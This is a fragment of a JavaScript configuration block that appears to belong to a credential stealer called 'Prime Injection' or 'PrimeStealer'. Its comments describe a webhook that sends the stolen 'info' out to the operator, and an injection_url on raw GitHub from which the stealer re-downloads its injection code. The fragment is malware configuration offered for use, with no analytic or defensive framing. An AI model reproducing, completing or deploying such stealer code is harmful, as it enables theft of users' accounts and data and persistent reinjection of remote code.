...
const config = {
    ...
    embed_name: 'Prime Injection', //name of the webhook thats gonna send the info
    embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
    ...
    injection_url: 'https://raw.githubusercontent.com/PrimeInj/injection/main/index.js', //injection url for when it reinjects
